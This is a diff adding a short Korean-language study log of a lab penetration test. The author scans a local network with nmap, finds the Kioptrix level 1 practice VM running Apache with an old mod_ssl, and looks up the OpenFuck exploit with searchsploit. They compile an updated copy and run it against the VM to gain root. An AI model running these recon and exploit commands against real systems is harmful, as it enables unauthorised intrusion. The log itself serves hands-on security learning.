@@ -2,3 +2,38 @@
 
 활동 내용: vmware & kali linux 설치 및 kioptrix.lv1 모의 해킹
 
+1. vmware 설치 및 실행
+   환경 설정 및 관리자 권한으로 실행
+   vmare에서 kioptrix.lv1과 kali linux 실행
+
+2. kioptrix.lv1 분석
+ 2-1) kali에서 ifconfig를 통하여 로컬 내트워크 대역 발견
+      192.168.0.0 ~ 192.168.0.255 
+
+ 2-2) kioptrix의 주소 확인
+      nmap -sn 192.168.0.0/24
+      result: 192.168.0.15
+
+ 2-3) kioptrix 취약점 찾기
+      nmap -A 192.168.0.15
+      result: http 즉 web서비스를 제공, Apache 1.3.20 및 mod ssl 2.8.4를 사용한다는 것을 확인
+
+ 2-4) Apache mod_ssl의 취약점 찾기
+      searchsploit mod_ssl
+      result: Exploit-DB 로컬 인덱스에서 해당 버전의 pache mod_ssl 취약점 찾기 가능 OpenFuck이라는 exploit 발견
+
+3. OpenFuck version update
+   OpenFuck -> Broken
+   Googling -> Updated version of OpenFuck
+   sudo apt-get install libssl-dev
+   gcc -o openfuck openfuck_updated.c -lcrypto
+   result : exploit 성공
+
+4. Attack
+   ./openfuck
+   ./openfuck 0x6b 192.168.0.15 -c 40
+   result: root 권한 탈취 성공, 비밀번호 재설정 가능
+
+
+      
+      
